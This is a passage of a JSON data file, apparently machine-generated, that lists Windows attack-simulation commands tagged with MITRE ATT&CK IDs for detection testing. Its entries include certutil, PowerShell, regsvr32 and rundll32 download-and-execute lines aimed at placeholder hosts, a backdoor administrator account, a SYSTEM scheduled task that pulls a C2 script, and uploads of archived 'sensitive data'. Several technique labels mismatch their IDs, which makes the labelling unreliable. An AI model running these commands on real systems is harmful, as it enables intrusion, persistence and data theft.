      "description": "Creates a Windows service using the built-in sc.exe utility with a command that writes to a temporary file. Simulates creation of a system process via service installation.",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "A new service named 'TestService' is created. When started, it executes cmd.exe to write a test string to a file in %TEMP%. Requires administrator privileges to create services.",
      "source": "langchain",
      "generated_at": "2025-12-23T07:15:15.988776",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "ffd80d53-849b-4fd6-be9f-f00049955b59",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "Create or Modify System Process",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Start-Process -FilePath 'svchost.exe' -ArgumentList '-k netsvcs' -WindowStyle Hidden -ErrorAction SilentlyContinue\"",
      "description": "Attempts to directly execute svchost.exe with a valid-looking group parameter. This is abnormal as svchost is typically launched by the Service Control Manager.",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "PowerShell attempts to spawn svchost.exe directly. Will likely fail due to internal svchost validation, but mimics attacker behavior trying to spoof or misuse system processes.",
      "source": "langchain",
      "generated_at": "2025-12-23T07:15:15.988776",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "70975c24-baad-4b59-8dd1-d313b68a263e",
      "ttp_id": "unknown",
      "technique_id": "T1047",
      "technique_name": "Create or Modify System Process",
      "tactic": "execution",
      "platform": "windows",
      "command": "wmic process call create \"cmd.exe /c %WINDIR%\\\\system32\\\\svchost.exe -k netsvcs\"",
      "description": "Uses WMIC to create a new process spawning svchost.exe from cmd.exe, which is atypical and suspicious.",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "WMIC instructs the OS to launch cmd.exe which then attempts to run svchost.exe with a host group key. This imitates abuse of legitimate tools to spawn system processes from non-system parents.",
      "source": "langchain",
      "generated_at": "2025-12-23T07:15:15.988776",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "641f6d24-37d3-4456-a857-608944c98e14",
      "ttp_id": "unknown",
      "technique_id": "T1204",
      "technique_name": "User Execution",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil.exe -urlcache -split -f http://192.168.1.100/malicious.exe %TEMP%\\\\payload.exe && start %TEMP%\\\\payload.exe",
      "description": "Download and execute a payload using certutil, a built-in Windows utility often abused for file download.",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Downloads a file from a remote server to the TEMP directory and executes it. The 'start' command launches the downloaded executable.",
      "source": "langchain",
      "generated_at": "2025-12-23T07:16:44.316991",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "103227fd-31ac-4a42-a00f-115a0a4dff45",
      "ttp_id": "unknown",
      "technique_id": "T1204",
      "technique_name": "User Execution",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/script.ps1')\"",
      "description": "Download and execute a PowerShell script from a remote server using WebClient.",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Fetches a PowerShell script from a remote URL and executes it in memory. No file is written to disk.",
      "source": "langchain",
      "generated_at": "2025-12-23T07:16:44.316991",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "7a5de1be-4733-4d58-816d-ad841c3f48e3",
      "ttp_id": "unknown",
      "technique_id": "T1204",
      "technique_name": "User Execution",
      "tactic": "execution",
      "platform": "windows",
      "command": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject('script:http://192.168.1.100/script.sct').Exec();",
      "description": "Abuse of rundll32.exe to execute script-based payloads via Windows Script Host.",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Loads and executes a remote script (SCT file) using the Windows Script Host through a maliciously crafted JavaScript call.",
      "source": "langchain",
      "generated_at": "2025-12-23T07:16:44.316991",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "2792c0d7-2278-4807-8843-6a1989a416af",
      "ttp_id": "unknown",
      "technique_id": "T1543.003",
      "technique_name": "Create or Modify System Process",
      "tactic": "execution",
      "platform": "windows",
      "command": "sc.exe create TestService binPath= \"cmd.exe /c echo test > %TEMP%\\\\test.txt\" start= auto",
      "description": "Creates a Windows service using sc.exe to establish persistence",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "Creates a new service named 'TestService' that runs cmd.exe to write a test file to %TEMP%. Requires elevated privileges. Service will persist across reboots until removed.",
      "source": "langchain",
      "generated_at": "2025-12-23T07:15:15.677736",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "b9aab164-3715-4f49-a2e0-1bc4d8f5244e",
      "ttp_id": "unknown",
      "technique_id": "T1053.005",
      "technique_name": "Create or Modify System Process",
      "tactic": "execution",
      "platform": "windows",
      "command": "schtasks.exe /create /tn \"Updater\" /tr \"powershell -Command \\\"Invoke-WebRequest -Uri http://example.com/c2.ps1 -OutFile %TEMP%\\\\c2.ps1; powershell -Exec Bypass -File %TEMP%\\\\c2.ps1\\\"\" /sc hourly /ru SYSTEM",
      "description": "Creates a scheduled task that runs a PowerShell command to download and execute a script",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "Creates a scheduled task named 'Updater' that runs hourly as SYSTEM. The task attempts to download and execute a PowerShell script. In testing, the URI should be benign or unreachable to avoid actual payload retrieval.",
      "source": "langchain",
      "generated_at": "2025-12-23T07:15:15.677736",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "6d07a85a-a6c5-496d-9f03-161a8087d168",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "Create or Modify System Process",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Start-Process powershell -ArgumentList '-EncodedCommand JABXAHIAZQBhAHQAZQAtAEgAbwBzAHQAIAAnAFQAZQBzAHQAJwA=' -Verb RunAs\"",
      "description": "Executes an encoded PowerShell command via Start-Process with elevated privileges",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "Prompts for elevation and runs a new PowerShell instance with an encoded command that executes Write-Host 'Test'. The Base64 string is UTF-16LE encoded. This simulates execution of obfuscated scripts commonly seen in attacks.",
      "source": "langchain",
      "generated_at": "2025-12-23T07:15:15.677736",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "a15f05a9-7496-487e-9c30-f0e7d0c3660e",
      "ttp_id": "unknown",
      "technique_id": "T1059",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd.exe /c echo Hello from cmd && ipconfig /all",
      "description": "Basic command execution using cmd.exe with /c flag to execute multiple built-in commands",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Executes echo and ipconfig commands, displays output, then terminates",
      "source": "langchain",
      "generated_at": "2025-12-23T07:15:46.705992",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "732d24ca-3c8b-4051-8f8a-a5584554cac1",
      "ttp_id": "unknown",
      "technique_id": "T1059",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd.exe /k net user attacker Password123! /add && net localgroup administrators attacker /add",
      "description": "Intermediate command using cmd.exe with /k to execute user creation and privilege escalation via built-in net.exe",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "Adds a new local user and adds them to the administrators group, then keeps the command prompt open",
      "source": "langchain",
      "generated_at": "2025-12-23T07:15:46.705992",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "95728264-03bf-4115-8434-bce43b6110b4",
      "ttp_id": "unknown",
      "technique_id": "T1059",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Start-Process cmd.exe -ArgumentList '/c certutil -urlcache -split -f http://example.com/malware.exe %TEMP%\\\\malware.exe' -Verb RunAs\"",
      "description": "Advanced command using PowerShell to spawn elevated cmd.exe process that downloads and saves a file using certutil",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "Prompts for elevation, then uses certutil to simulate downloading a file to the temp directory",
      "source": "langchain",
      "generated_at": "2025-12-23T07:15:46.705992",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "22cd5ed8-7030-4f72-8240-e49c8410d1f4",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "Scripting",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil.exe -urlcache -f http://192.168.1.100/shell.js .\\shell.js && cscript //E:JScript %TEMP%\\\\shell.js",
      "description": "Download and execute a JScript file using certutil and cscript",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Downloads a JScript file to the temp directory and executes it using cscript. Simulates script-based execution via built-in Windows tools.",
      "source": "langchain",
      "generated_at": "2025-12-23T07:16:43.551918",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "84cf04c7-c2d9-434c-8978-d128adbdbb70",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "Scripting",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/script.ps1')\"",
      "description": "Download and execute a PowerShell script from a remote server",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Uses PowerShell to download and execute a remote script. This command is high risk due to direct execution of downloaded code.",
      "source": "langchain",
      "generated_at": "2025-12-23T07:16:43.551918",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "01385faf-bd3b-4f6a-9e45-85441c063d6d",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "Scripting",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Write-Host 'Test execution'; Start-Process notepad.exe -WindowStyle Hidden\"",
      "description": "Simulate benign script execution with hidden process launch",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Outputs a test message and starts notepad.exe in a hidden window. Mimics stealthy script behavior without malicious payload.",
      "source": "langchain",
      "generated_at": "2025-12-23T07:16:43.551918",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "705ab020-2214-4a60-9edb-9121ec7af394",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "Scripting",
      "tactic": "execution",
      "platform": "windows",
      "command": "cscript //E:jscript \"%TEMP%\\\\test.js\"",
      "description": "Execute a JScript file using cscript, a built-in Windows scripting host, to simulate malicious script execution.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "cscript will attempt to execute the script file located in the TEMP directory. If the file does not exist, it will return an error. No system changes are expected.",
      "source": "langchain",
      "generated_at": "2025-12-23T07:16:43.854051",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "1b0b6c54-6f6e-4450-8d46-c4c125b1d760",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "Scripting",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Invoke-WebRequest -Uri 'http://example.com/script.txt' -OutFile '%TEMP%\\\\stage.ps1' -ErrorAction SilentlyContinue; If (Test-Path '%TEMP%\\\\stage.ps1') { . '%TEMP%\\\\stage.ps1' }\"",
      "description": "Download a PowerShell script from a remote server and execute it in the current session using built-in PowerShell cmdlets.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "The command attempts to download a script to the TEMP directory and execute it. If the URI is unreachable or the file does not exist, execution is skipped. No payload is active; this is for detection testing only.",
      "source": "langchain",
      "generated_at": "2025-12-23T07:16:43.854051",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "5ec12720-b888-424b-9a73-35c9b038864e",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "Scripting",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('Write-Output \\\"Script executed from memory\\\"'))\"; powershell -EncodedCommand \"\"",
      "description": "Generate and demonstrate execution of a PowerShell encoded command using UTF-16LE (Unicode) encoding, commonly used to obfuscate malicious scripts.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "The first part generates a Base64-encoded UTF-16LE string of a simple Write-Output command. The second part would execute it if the encoded string were provided. This simulates memory-resident script execution without writing to disk.",
      "source": "langchain",
      "generated_at": "2025-12-23T07:16:43.854051",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "1d247cc8-c8a9-4ade-b0d4-04d5801f35b4",
      "ttp_id": "unknown",
      "technique_id": "T1202",
      "technique_name": "Process Injection",
      "tactic": "execution",
      "platform": "windows",
      "command": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();h=new%20ActiveXObject(\"WScript.Shell\").Run(\"cmd.exe /c calc.exe\",0);",
      "description": "Abuse rundll32.exe to execute JavaScript and spawn a hidden cmd.exe process to launch calc.exe, simulating masquerading and process injection via a trusted binary.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "rundll32.exe spawns cmd.exe in a hidden window which executes calc.exe. This is a known masquerading technique often used to bypass application controls and initiate code injection.",
      "source": "langchain",
      "generated_at": "2025-12-23T07:16:44.115802",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "3a7be534-a2e2-45f0-aa17-be11acb3187b",
      "ttp_id": "unknown",
      "technique_id": "T1218.010",
      "technique_name": "Process Injection",
      "tactic": "execution",
      "platform": "windows",
      "command": "regsvr32.exe /s /n /u /i:https://example.com/script.sct scrobj.dll",
      "description": "Use regsvr32.exe to silently download and execute a remote script (SCT file) from a specified URL, leveraging a trusted Windows binary for remote code execution.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "regsvr32.exe contacts the remote server to retrieve and execute the script.sct file without user interaction. This technique is commonly used to bypass AppLocker and execute code in memory.",
      "source": "langchain",
      "generated_at": "2025-12-23T07:16:44.115802",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "bdaa80f5-6c8c-4c16-a373-e8ca7acde425",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "Process Injection",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1:8000/payload.ps1')\"",
      "description": "Use PowerShell to download and execute a remote script from a local web server, simulating fileless execution and code injection via memory-resident payloads.",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "PowerShell downloads the payload.ps1 script from the local web server and executes it directly in memory. No file is written to disk, making detection more difficult. This is a common method for executing payloads during post-exploitation.",
      "source": "langchain",
      "generated_at": "2025-12-23T07:16:44.115802",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "045ffe2f-21ee-44a5-a7d5-80a7cb0601b1",
      "ttp_id": "unknown",
      "technique_id": "T1105",
      "technique_name": "Application Layer Protocol",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil.exe -urlcache -split -f \"http://192.168.1.100/payload.txt\" \"%TEMP%\\\\stage.txt\"",
      "description": "Download a file using certutil, a built-in Windows utility often abused for C2 beaconing or payload staging.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Attempts to download a file from a specified HTTP URL to the user's TEMP directory. Will display progress and result status; may leave behind cached files.",
      "source": "langchain",
      "generated_at": "2025-12-23T07:15:15.640353",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "3da1dcce-ba63-4f67-a29b-2f56e9d17dec",
      "ttp_id": "unknown",
      "technique_id": "T1071.001",
      "technique_name": "Application Layer Protocol",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"IWR -Uri 'http://192.168.1.100/beacon.php' -Method POST -Body (ConvertTo-Json @{os=(gwmi Win32_OperatingSystem).Caption; user=$env:USERNAME}) -UseBasicParsing -ErrorAction SilentlyContinue\"",
      "description": "Send system and user context information to a remote server using PowerShell Invoke-WebRequest with JSON encoding.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Sends a POST request with basic system info in JSON format to a remote endpoint. Uses basic parsing to avoid loading external modules. Fails silently if network is unreachable.",
      "source": "langchain",
      "generated_at": "2025-12-23T07:15:15.640353",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "c9278fce-1a32-4a59-a801-997dedcda462",
      "ttp_id": "unknown",
      "technique_id": "T1197",
      "technique_name": "Application Layer Protocol",
      "tactic": "execution",
      "platform": "windows",
      "command": "bitsadmin.exe /transfer n1 /download /priority normal \"http://192.168.1.100/update.bin\" \"%TEMP%\\\\update.bin\"",
      "description": "Use BITSAdmin to silently download a file in the background, mimicking legitimate update behavior.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a BITS job to download a file asynchronously. The job remains visible until completed or cleaned up. File is saved to TEMP directory upon success.",
      "source": "langchain",
      "generated_at": "2025-12-23T07:15:15.640353",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "3c047e17-60b9-40df-a55b-e92ff1ae5390",
      "ttp_id": "unknown",
      "technique_id": "T1059.003",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd.exe /c echo \"Malicious command execution via cmd\" & whoami & ipconfig",
      "description": "Basic command-line execution using built-in Windows utilities to gather system information, simulating initial reconnaissance.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Executes simple system commands (whoami, ipconfig) through cmd.exe and prints a message. No persistence or network activity.",
      "source": "langchain",
      "generated_at": "2025-12-23T07:16:43.928050",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "67133d68-76c4-4d43-a135-bb2fa044e75c",
      "ttp_id": "unknown",
      "technique_id": "T1140",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil.exe -urlcache -f http://example.com/malware.txt %TEMP%\\\\stage.txt & type %TEMP%\\\\stage.txt & del %TEMP%\\\\stage.txt",
      "description": "Intermediate use of certutil to download a file to temp directory, display its contents, and delete it \u2014 mimicking staged payload retrieval.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Attempts to fetch a file from a URL (will fail without connectivity), outputs content if present, then deletes the file. Uses only built-in Windows tools.",
      "source": "langchain",
      "generated_at": "2025-12-23T07:16:43.928050",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "2425d765-64cc-4502-b5b9-24e6c4528174",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"try { $command = 'Write-Output \\u0027Test execution via encoded command\\u0027'; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encoded = [Convert]::ToBase64String($bytes); Start-Process powershell -ArgumentList '-EncodedCommand', $encoded -WindowStyle Hidden } catch { exit 1 }\"",
      "description": "Advanced technique using PowerShell to execute an encoded command, simulating evasion of command-line logging.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Generates a Base64-encoded UTF-16LE string of a benign PowerShell command and executes it in a hidden window to simulate stealthy execution.",
      "source": "langchain",
      "generated_at": "2025-12-23T07:16:43.928050",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "88e2ae86-4ba8-4339-93ad-3bdbf5794e72",
      "ttp_id": "unknown",
      "technique_id": "T1027",
      "technique_name": "Obfuscated Files or Information",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil.exe -decode \"%TEMP%\\\\encoded.txt\" \"%TEMP%\\\\decoded.bat\"",
      "description": "Decodes a Base64-encoded file using certutil, a common technique to deliver obfuscated payloads.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Extracts a decoded batch script from an encoded text file in the temp directory. Certutil is a legitimate Windows binary often abused for decoding payloads.",
      "source": "langchain",
      "generated_at": "2025-12-23T07:16:44.740548",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "90674729-19f6-4472-8bfd-2c06980848f7",
      "ttp_id": "unknown",
      "technique_id": "T1027",
      "technique_name": "Obfuscated Files or Information",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"[Convert]::FromBase64String('VwByAGkAdABlAC0ASABvAHMAdAAgACcAVABlAHMAdAAgAG8AYgBmAHUAcwBjAGEAdABpAG8AbgAnAA==') | ForEach-Object { [char]$_ } | Out-String | Invoke-Expression\"",
      "description": "Executes a Base64-encoded PowerShell command that decodes and runs a simple Write-Host statement. The string is encoded from UTF-16LE bytes as required.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Prints 'Test obfuscation' to the console after decoding the Base64 string. Uses only built-in .NET and PowerShell methods.",
      "source": "langchain",
      "generated_at": "2025-12-23T07:16:44.740548",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "5c330df4-3743-4fc0-92e0-bb7728b61fc4",
      "ttp_id": "unknown",
      "technique_id": "T1027",
      "technique_name": "Obfuscated Files or Information",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd.exe /c echo echo Hello ^> \"%TEMP%\\\\test.txt\" ^& certutil -encode \"%TEMP%\\\\test.txt\" \"%TEMP%\\\\encoded.txt\" ^>nul 2^>^&1 ^& del \"%TEMP%\\\\test.txt\"",
      "description": "Generates a simple batch command that creates a text file, encodes it using certutil, and deletes the original\u2014simulating obfuscation of data for exfiltration or execution.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates an encoded version of a benign text file in the temp directory and removes the original. Uses only built-in Windows tools (cmd, certutil).",
      "source": "langchain",
      "generated_at": "2025-12-23T07:16:44.740548",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "aea532e6-200e-4055-824d-60ea99e64b56",
      "ttp_id": "unknown",
      "technique_id": "T1105",
      "technique_name": "Exfiltration Over C2 Channel",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil.exe -urlcache -f http://192.168.1.100:8080/stage2.exe %TEMP%\\\\stage2.exe && %TEMP%\\\\stage2.exe",
      "description": "Download payload using certutil and execute from temp directory",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "certutil fetches executable from attacker-controlled server and saves it to %TEMP%, then executes it locally",
      "source": "langchain",
      "generated_at": "2025-12-23T07:15:43.916170",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "e9cb62b6-f411-4d34-b96a-9a2af7fb7064",
      "ttp_id": "unknown",
      "technique_id": "T1105",
      "technique_name": "Exfiltration Over C2 Channel",
      "tactic": "execution",
      "platform": "windows",
      "command": "bitsadmin.exe /transfer exfiljob /download /priority normal http://192.168.1.100:8080/exfil.txt %TEMP%\\\\exfil.txt",
      "description": "Use BITSAdmin to silently download a file in the background",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "BITSAdmin creates a background download job to retrieve a file and store it in %TEMP% without immediate execution",
      "source": "langchain",
      "generated_at": "2025-12-23T07:15:43.916170",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "19c77a2e-2952-4682-8723-36b7b5cc4104",
      "ttp_id": "unknown",
      "technique_id": "T1071.001",
      "technique_name": "Exfiltration Over C2 Channel",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Compress-Archive -Path %TEMP%\\\\sensitive_data\\* -DestinationPath %TEMP%\\\\archive.zip -Force; Invoke-WebRequest -Uri http://192.168.1.100:8080/upload -Method POST -InFile %TEMP%\\\\archive.zip -ErrorAction SilentlyContinue; Remove-Item %TEMP%\\\\archive.zip -Force -ErrorAction SilentlyContinue\"",
      "description": "Archive exfiltrated data and send via HTTP POST using PowerShell",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "PowerShell compresses a directory of data, uploads it to C2 via HTTP POST, then deletes the local archive",
      "source": "langchain",
      "generated_at": "2025-12-23T07:15:43.916170",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "a53ab758-2ce0-440c-9d8c-b639f3159a77",
      "ttp_id": "unknown",
      "technique_id": "T1560",
      "technique_name": "Archive Collected Data",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil.exe -compress C:\\Windows\\Temp\\sensitive_data.txt C:\\Windows\\Temp\\archive.cab",
      "description": "Compresses a sensitive data file using certutil, a built-in Windows utility commonly abused for archiving.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a .cab archive from the specified file if it exists; otherwise fails with an error. certutil is a legitimate tool used for certificate operations but supports compression.",
      "source": "langchain",
      "generated_at": "2025-12-23T07:15:44.725346",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "97a7c787-35ed-4105-b1ad-d08bb085defd",
      "ttp_id": "unknown",
      "technique_id": "T1560",
      "technique_name": "Archive Collected Data",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Compress-Archive -Path $env:TEMP\\\\staged_data_* -DestinationPath $env:TEMP\\\\exfil_archive.zip -Force -ErrorAction SilentlyContinue\"",
      "description": "Uses PowerShell's Compress-Archive to bundle multiple staged data files into a ZIP archive, simulating preparation for exfiltration.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates a ZIP archive at the specified destination path if source files exist; overwrites existing archive due to -Force. Runs silently on error.",
      "source": "langchain",
      "generated_at": "2025-12-23T07:15:44.725346",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "1e3c0c8f-7a07-4495-b2ba-930f82ec24b2",
      "ttp_id": "unknown",
      "technique_id": "T1560",
      "technique_name": "Archive Collected Data",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"try { $content = 'Test data for archiving'; $path = '$env:TEMP\\\\test_stage.txt'; $content | Out-File -FilePath $path -Encoding ASCII; Compress-Archive -Path $path -DestinationPath $env:TEMP\\\\test_archive.zip -Update } catch { exit 1 }\"",
      "description": "Stages test data into a file and compresses it into an archive using PowerShell, demonstrating a complete simulated data staging and archiving workflow.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a temporary text file with test data and archives it. The -Update flag allows adding to an existing archive. Safe test strings are used, no real sensitive data involved.",
      "source": "langchain",
      "generated_at": "2025-12-23T07:15:44.725346",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "ff7de4d6-53e8-47b2-b30e-200aa3c9b8c2",
      "ttp_id": "unknown",
      "technique_id": "T1053.005",
      "technique_name": "Scheduled Task/Job",
      "tactic": "execution",
      "platform": "windows",
      "command": "schtasks.exe /Create /TN \"UpdateChecker\" /TR \"cmd.exe /c echo Running & exit\" /SC ONLOGON /RU SYSTEM",
      "description": "Creates a scheduled task that runs on system login as SYSTEM using legacy schtasks.exe utility",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "A new scheduled task named 'UpdateChecker' is created in the Task Scheduler library, set to run at system logon under the SYSTEM account. The task executes a harmless cmd command.",
      "source": "langchain",
      "generated_at": "2025-12-23T07:15:44.514514",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "5bb2f6ac-9700-4081-af5e-fc9df0532d01",
      "ttp_id": "unknown",
      "technique_id": "T1053.005",
      "technique_name": "Scheduled Task/Job",
      "tactic": "execution",
      "platform": "windows",
